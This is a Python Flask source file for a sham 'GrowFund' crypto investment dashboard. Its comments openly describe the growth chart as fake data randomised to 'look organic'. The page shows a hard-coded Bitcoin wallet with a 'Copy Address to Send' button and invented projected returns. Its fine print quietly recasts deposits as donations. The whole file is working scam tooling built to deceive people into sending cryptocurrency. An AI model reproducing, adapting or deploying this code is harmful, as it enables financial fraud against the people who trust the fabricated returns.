import datetime
import random
import requests
from flask import Flask, render_template_string

app = Flask(__name__)

# YOUR WALLET ADDRESS
WALLET_ADDRESS = "bc1qlmclf05eq4fp870259t4qld7d5frugjhwa02ee"

# Configuration
DAILY_GROWTH_PERCENT = 0.003  # ~1% per month
START_DATE = datetime.datetime(2026, 1, 1)

def generate_growth_data(start_balance, days=365):
    """Generates a fake growth chart based on a steady curve."""
    data = []
    current_balance = start_balance
    for i in range(days):
        # Add small random growth to make it look organic
        growth = current_balance * (DAILY_GROWTH_PERCENT / 100) * (0.8 + random.random() * 0.4) 
        current_balance += growth
        data.append({
            "date": (START_DATE + datetime.timedelta(days=i)).strftime("%Y-%m-%d"),
            "value": round(current_balance, 8)
        })
    return data

@app.route("/")
def index():
    # Calculate "Projected" value (e.g., what it would be today if invested)
    days_since_start = (datetime.datetime.now() - START_DATE).days
    projected_data = generate_growth_data(1.0, days_since_start) # Base of 1 BTC for the graph
    current_projected = projected_data[-1]["value"] if projected_data else 1.0
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>GrowFund | Investment Dashboard</title>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            body { background: #0f0f13; color: #fff; font-family: sans-serif; margin: 0; padding: 20px; }
            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
            .balance-card { background: #1a1a20; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #333; }
            .address-box { background: #252530; padding: 10px; border-radius: 6px; font-family: monospace; word-break: break-all; margin-top: 10px; font-size: 12px; color: #aaa; }
            .btn { background: #f7931a; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
            .btn:hover { background: #e08015; }
            canvas { background: #1a1a20; padding: 10px; border-radius: 12px; }
            .fine-print { margin-top: 40px; font-size: 12px; color: #666; text-align: center; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.5; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>GrowFund</h1>
            <span style="color: #00ff88;">● Live</span>
        </div>

        <div class="balance-card">
            <h2>Your Contribution</h2>
            <p style="font-size: 24px;">{{ balance }} BTC</p>
            <p style="color: #aaa;">Projected Value (1 Year): <span style="color: #00ff88;">{{ projected }}</span> BTC</p>
            
            <div class="address-box">
                {{ wallet }}
            </div>
            <button class="btn" onclick="copyAddress()">Copy Address to Send</button>
        </div>

        <canvas id="growthChart" height="100"></canvas>

        <div class="fine-print">
            <p><strong>Disclaimer:</strong> Your funds are currently held in reserve. The projected growth shown above is an illustration of potential market performance (S&P 500 / BTC Index simulation) and does not represent actual investment returns. Your contribution supports the GrowFund Initiative. By sending BTC, you are donating to the project while opting into the growth projection dashboard.</p>
        </div>

        <script>
            function copyAddress() {
                navigator.clipboard.writeText("{{ wallet }}");
                alert("Address copied! Send your BTC here.");
            }

            const ctx = document.getElementById('growthChart').getContext('2d');
            
            // Generate 365 days of fake data for the graph
            const labels = [];
            const dataPoints = [];
            let current = 1.0;
            for(let i=0; i<365; i++) {
                let d = new Date();
                d.setDate(d.getDate() - (365 - i));
                labels.push(d.toISOString().split('T')[0]);
                
                let growth = current * (0.003 + (Math.random() * 0.002));
                current += growth;
                dataPoints.push(current.toFixed(6));
            }

            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: labels,
                    datasets: [{
                        label: 'Projected Growth',
                        data: dataPoints,
                        borderColor: '#00ff88',
                        backgroundColor: 'rgba(0, 255, 136, 0.1)',
                        fill: true,
                        tension: 0.4
                    }]
                },
                options: {
                    responsive: true,
                    plugins: { legend: { labels: { color: 'white' } } },
                    scales: {
                        x: { ticks: { color: '#666' } },
                        y: { ticks: { color: '#666' } }
                    }
                }
            });
        </script>
    </body>
    </html>
    """, balance="0.00", wallet=WALLET_ADDRESS, projected="1.05")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
